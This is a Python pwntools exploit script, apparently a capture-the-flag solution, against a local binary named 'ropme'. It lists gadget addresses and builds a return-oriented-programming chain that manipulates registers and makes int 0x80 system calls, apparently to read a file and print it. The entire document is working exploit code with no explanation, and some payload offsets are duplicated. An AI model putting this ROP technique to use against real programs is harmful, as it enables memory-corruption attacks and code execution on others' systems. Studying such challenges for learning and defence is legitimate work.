#!/usr/bin/env python2

from pwn import *


#gadgets


# main_ 0x80484eb
    # push ebp
    # move ebp, esp
    # retn

# sub_80484ef
    # xor edx, edx
    # retn

# sub_80484f2
    # int 0x80
    # retn

# sub_80484f5
    # sub ecx, 0x4
    # retn

# sub_80484f9
    # mov eax, ecx
    # retn

# sub_80484fc
    # add edx, 0x1
    # retn

# sub_8048500:
    # mov eax, edx
    # mov ebx, edx      0x8048504
    # retn

# sub_8048505:
    # inc edx
    # retn

# sub_8048508:
    # pop ebp
    # retn

# fini_ 
    # pop ebx
    # ret

# 0x8048379
    # pop ebx
    # ret

p = process('./ropme')
pause()
p.recvuntil("Gimme data:", drop=True)
p.recvline()

# fd for read is 0x3
payload = fit({
    0x0c: 0x80484ef,    # xor edx, edx; ret
    0x10: 0x8048505,    # inc edx
    0x14: 0x8048505,    # inc edx
    0x18: 0x8048505,    # inc edx
    0x1c: 0x8048500,    # mov eax, edx; mov ebx, edx; ret
    0x20: 0x8048505,    # inc edx
    0x24: 0x8048505,    # inc edx
    0x28: 0x8048505,    # inc edx
    0x2c: 0x8048505,    # inc edx
    0x30: 0x8048505,    # inc edx
    0x34: 0x8048505,    # inc edx
    0x38: 0x8048505,    # inc edx
    0x3c: 0x8048505,    # inc edx
    0x40: 0x8048505,    # inc edx
    0x44: 0x8048505,    # inc edx
    0x48: 0x8048505,    # inc edx
    0x4c: 0x8048505,    # inc edx
    0x50: 0x8048505,    # inc edx
    0x54: 0x8048505,    # inc edx
    0x58: 0x8048505,    # inc edx
    0x5c: 0x8048505,    # inc edx
    0x60: 0x8048505,    # inc edx
    0x64: 0x8048505,    # inc edx
    0x68: 0x8048505,    # inc edx
    0x6c: 0x8048505,    # inc edx
    0x60: 0x8048505,    # inc edx
    0x64: 0x8048505,    # inc edx
    0x68: 0x8048505,    # inc edx
    0x6c: 0x8048505,    # inc edx
    0x70: 0x8048505,    # inc edx
    0x74: 0x8048505,    # inc edx
    0x78: 0x8048505,    # inc edx
    0x7c: 0x8048505,    # inc edx
    0x80: 0x80484f2,    # int 0x80; ret
    0x84: 0x80484ec,    # mov ebp, esp; ret;
    0x88: 0x804859a,    # mov eax, 0; leave; ret
    0x8c: 0x80484ef,    # xor edx, edx
    0x90: 0x8048505,    # inc edx
    0x94: 0x8048505,    # inc edx
    0x98: 0x8048505,    # inc edx
    0x9c: 0x8048505,    # inc edx
    0xa0: 0x8048500,    # mov eax, edx; mov ebx, edx; ret
    0xa4: 0x8048379,    # pop ebx; ret
    0xa8: 0x0000001,    # stdout fd
    0xac: 0x8048505,    # inc edx
    0xb0: 0x8048505,    # inc edx
    0xb4: 0x8048505,    # inc edx
    0xb8: 0x8048505,    # inc edx
    0xbc: 0x8048505,    # inc edx
    0xc0: 0x8048505,    # inc edx
    0xc4: 0x8048505,    # inc edx
    0xc8: 0x8048505,    # inc edx
    0xcc: 0x8048505,    # inc edx
    0xd0: 0x8048505,    # inc edx
    0xd4: 0x8048505,    # inc edx
    0xd8: 0x8048505,    # inc edx
    0xdc: 0x8048505,    # inc edx
    0xe0: 0x8048505,    # inc edx
    0xe4: 0x8048505,    # inc edx
    0xe8: 0x8048505,    # inc edx
    0xec: 0x8048505,    # inc edx
    0xf0: 0x8048505,    # inc edx
    0xf4: 0x8048505,    # inc edx
    0xf8: 0x8048505,    # inc edx
    0xfc: 0x8048505,    # inc edx
    0x100: 0x8048505,   # inc edx
    0x104: 0x8048505,   # inc edx
    0x108: 0x80484f2,   # int 0x80; ret
}, filler='A')


p.sendline(payload)

p.interactive()
